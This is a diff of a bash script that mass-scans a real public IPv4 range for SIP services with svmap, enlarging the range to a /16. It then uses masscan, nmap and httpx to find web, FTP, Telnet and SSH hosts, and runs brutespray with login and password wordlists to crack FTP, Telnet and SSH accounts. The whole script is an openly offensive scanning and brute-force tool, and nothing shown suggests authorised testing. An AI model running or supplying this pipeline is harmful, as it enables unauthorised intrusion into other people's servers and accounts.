@@ -1,12 +1,10 @@
-سكان بورتات تست كراك تخمين صفحات
-
 #!/bin/bash
 
 # Scan IPv4 range on port sip
 
 echo -e "\nStart scanning ...\n"
 
-VAR0=188.165.50.0/18
+VAR0=188.165.50.0/16
 
          echo ----------------- $VAR0----------------
 python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR0 -m INVITE -v >> result.txt
@@ -37,9 +35,16 @@ grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" =204.txt > =204ip.txt
 masscan -iL =204ip.txt -p443,80,81,82,83,84,85,86,87,88,89,90,8000,8001,8008,8014,8015,8020,8028,8040,8080,8081,8082,8085,8088,8090,8118,8123,8180,8181,8182,8222,8243,8280,8300,8800,8888,8899,8983,9000,9002,9060,9080,9090,9091 --rate=200000 -oL masscan.txt
 awk '{print $4 ":" $3}' masscan.txt > =204new.txt # Save scan masscan Range 
 cat =204new.txt | docker run -i projectdiscovery/httpx -sc -title -server -t 250 -leave-default-ports -nc -v >> =204httpxresult.txt
+
+echo -e "\nEnding scan port !\n"
+
+# Scan masscan ports & Nmap service & Crack ftp,telnet,ssh
+
+echo -e "\nStart scan ports ...\n"
+
 masscan -iL =204ip.txt -p21,23,22 --exclude 255.255.255.255 --rate=50000 --wait 0 | awk '{print $6}' > ports.txt
 nmap -vv -iL ports.txt -p 21,23,22 -oX nmap.xml #  scan list ip masscan
-brutespray --file nmap.xml -U LOGIN.txt -P PASS.txt --service ftp,telnet,ssh --threads 10 --hosts 50 -c #  crack ftp,telnet,vnc
+brutespray --file nmap.xml -U LOGIN.txt -P PASS.txt --service ftp,telnet,ssh --threads 10 --hosts 30 -c #  crack ftp,telnet,vnc
 rm nmap.xml # remove the temporary file
 rm ports.txt # remove the temporary file
 rm =204new.txt  # remove the temporary file
@@ -47,7 +52,7 @@ rm =204ip.txt  # remove the temporary file
 rm masscan.txt # remove the temporary file
 sleep 5
 
-echo -e "\nEnding scan port !\n"
+echo -e "\nEnding scan port & crack service !\n"
 
 # SIP Crack
 
